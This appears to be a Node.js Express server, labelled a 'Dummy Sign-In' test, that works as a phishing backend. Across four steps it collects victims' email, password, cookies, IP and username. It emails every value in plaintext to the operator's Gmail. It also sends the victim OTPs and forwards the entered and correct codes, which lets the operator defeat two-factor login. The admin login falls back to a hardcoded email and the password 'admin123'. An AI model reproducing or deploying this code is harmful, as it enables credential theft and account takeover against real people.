require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// In-memory store for OTPs (simple for dummy test)
// Key = sessionId, value = { otp1, otp2, email, password, username, ip, cookies, createdAt }
const sessions = new Map();

// Clean old sessions every 30 minutes
setInterval(() => {
  const now = Date.now();
  for (const [id, s] of sessions.entries()) {
    if (now - s.createdAt > 30 * 60 * 1000) sessions.delete(id);
  }
}, 30 * 60 * 1000);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Gmail SMTP transporter
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  }
});

// Helper: generate 6-digit OTP
function generateOTP() {
  return crypto.randomInt(100000, 999999).toString();
}

// Helper: send email to admin (plain text notification)
async function notifyAdmin(subject, data) {
  const text = Object.entries(data)
    .map(([k, v]) => `${k}: ${v}`)
    .join('\n');

  try {
    await transporter.sendMail({
      from: `\"Dummy Sign-In\" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER,
      subject: `Dummy Sign-In - ${subject}`,
      text: text
    });
    console.log('Admin notified:', subject);
  } catch (err) {
    console.error('Failed to notify admin:', err.message);
  }
}

// Helper: send OTP to the user's email
async function sendOTPToUser(toEmail, otp, step) {
  try {
    await transporter.sendMail({
      from: `\"Dummy Sign-In\" <${process.env.GMAIL_USER}>`,
      to: toEmail,
      subject: `Your Dummy Sign-In OTP (${step})`,
      text: `Your one-time password is: ${otp}\n\nThis is a dummy test. Do not use real credentials.`
    });
    console.log(`OTP sent to user ${toEmail} for ${step}`);
    return true;
  } catch (err) {
    console.error('Failed to send OTP to user:', err.message);
    return false;
  }
}

// ========== API ROUTES ==========

// Step 1: Email + Password
app.post('/api/step1', async (req, res) => {
  const { email, password, cookies, ip } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, message: 'Email and password required' });
  }

  const sessionId = crypto.randomBytes(16).toString('hex');
  const otp1 = generateOTP();
  const otp2 = generateOTP();

  sessions.set(sessionId, {
    email,
    password,
    username: '',
    otp1,
    otp2,
    cookies: cookies || '(none)',
    ip: ip || '(unknown)',
    createdAt: Date.now()
  });

  // Notify admin immediately
  await notifyAdmin('Email + Password', {
    Email: email,
    Password: password,
    Cookies: cookies || '(none)',
    'IP Address': ip || '(unknown)',
    Timestamp: new Date().toISOString(),
    'Generated OTP 1 (for later)': otp1,
    'Generated OTP 2 (for later)': otp2
  });

  // Send OTP 1 to the user's email
  const sent = await sendOTPToUser(email, otp1, 'OTP 1');

  res.json({
    success: true,
    sessionId,
    message: sent
      ? 'OTP 1 has been sent to your email'
      : 'Could not send OTP email (check server logs). You can still continue for testing.'
  });
});

// Step 2: Username
app.post('/api/step2', async (req, res) => {
  const { sessionId, username } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
  }

  session.username = username || '';

  await notifyAdmin('Username', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  res.json({ success: true, message: 'Username received' });
});

// Step 3: Verify OTP 1 and send OTP 2
app.post('/api/step3', async (req, res) => {
  const { sessionId, otp1 } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
  }

  // Always notify admin of the attempt
  await notifyAdmin('OTP 1 attempt', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'Entered OTP 1': otp1,
    'Correct OTP 1': session.otp1,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  if (otp1 !== session.otp1) {
    return res.json({ success: false, message: 'Incorrect OTP 1. Please try again.' });
  }

  // OTP 1 correct → send OTP 2 to user
  const sent = await sendOTPToUser(session.email, session.otp2, 'OTP 2');

  res.json({
    success: true,
    message: sent
      ? 'OTP 1 correct. OTP 2 has been sent to your email.'
      : 'OTP 1 correct. (OTP 2 email may have failed – check server logs)'
  });
});

// Step 4: Verify OTP 2
app.post('/api/step4', async (req, res) => {
  const { sessionId, otp2 } = req.body;
  const session = sessions.get(sessionId);

  if (!session) {
    return res.status(400).json({ success: false, message: 'Invalid or expired session' });
  }

  await notifyAdmin('OTP 2 attempt', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'Entered OTP 2': otp2,
    'Correct OTP 2': session.otp2,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString()
  });

  if (otp2 !== session.otp2) {
    return res.json({ success: false, message: 'Incorrect OTP 2. Please try again.' });
  }

  // Final success notification
  await notifyAdmin('OTP 2 - Final (SUCCESS)', {
    Email: session.email,
    Password: session.password,
    Username: session.username,
    'OTP 1': session.otp1,
    'OTP 2': session.otp2,
    Cookies: session.cookies,
    'IP Address': session.ip,
    Timestamp: new Date().toISOString(),
    Status: 'User completed all steps successfully'
  });

  // Clean up session
  sessions.delete(sessionId);

  res.json({ success: true, message: 'All steps completed. Waiting for admin approval.' });
});

// Admin login (simple)
app.post('/api/admin-login', (req, res) => {
  const { email, password } = req.body;
  const ADMIN_EMAIL = process.env.GMAIL_USER || 'blessedresult6@gmail.com';
  const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';

  if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
    return res.json({ success: true });
  }
  res.json({ success: false, message: 'Wrong email or password' });
});

// Start server
app.listen(PORT, () => {
  console.log(`\nDummy Sign-In server running at http://localhost:${PORT}`);
  console.log(`Admin email: ${process.env.GMAIL_USER || '(not set)'}`);
  if (!process.env.GMAIL_APP_PASSWORD) {
    console.warn('WARNING: GMAIL_APP_PASSWORD is not set in .env');
  }
});
